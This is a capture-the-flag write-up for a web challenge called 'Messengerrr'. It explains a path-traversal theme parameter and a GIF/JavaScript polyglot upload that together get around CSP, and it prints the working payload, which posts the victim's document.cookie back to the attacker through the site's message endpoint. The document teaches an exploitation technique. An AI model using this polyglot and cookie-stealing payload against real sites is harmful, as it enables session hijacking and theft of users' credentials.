@@ -1,0 +1,35 @@
+Web 300: Messengerrr
+This challenge essentially boils down to a really tricky XSS. You're given the
+user ID of someone to victimize over an anonymous messaging service. You can
+upload images (which must be valid, as they are actually parsed), and you can
+select a "theme". The theme on its own is not vulnerable, but due to lack of
+input validation, you can put your own string instead of one that is provided,
+and reference any file on the server. There is CSP in place, preventing access
+of remote files. 
+
+The "rainy" theme inserts the following HTML in your message:
+
+    <link href="static/css/themes/rainy.min.css" rel="stylesheet" type="text/css">
+    <script type="text/javascript" src="/static/js/themes/rainy.min.js"></script>
+
+Because there's no other XSS vector, we need to use this. We control the string
+"rainy" and can change it to "rainy/../../../../uploads/user_id/file_we_control.gif?":
+
+    <link href="static/css/themes/rainy/../../../../uploads/user_id/file_we_control.gif?.min.css" rel="stylesheet" type="text/css">
+    <script type="text/javascript" src="/static/js/themes/rainy/../../../../uploads/user_id/file_we_control.gif?.min.js"></script>
+
+The "?" invalidates the ".min.css" and ".min.js". Now we need a valid image
+that parses properly and is valid javascript. I opted for a .gif since the jpeg
+header contains unprintable characters which bork our image. Here is the image
+I came up with:
+
+$ cat wat.gif
+GIF89a= "����,L;";
+$.post("/savemsg", {to:"5decf6537c6840928cb9d95937048b30", subject:"I am noob", text:"hi: "+document.cookie, theme:"rainy", img:"lol.jpg"});
+
+The four bytes after the GIF89a control the size of the image. There are strict
+checks on the dimensions, ensuring we don't exceed 4096x4096. I had to space
+my characters out and pick the lowest characters that would not affect my js.
+Luckily, a tab is just 0x9 in ascii, which doesn't affect our size by much.
+After that, we send our message with our fancy/dangerous theme to the victim
+and it sends back its cookies (containing the flag).
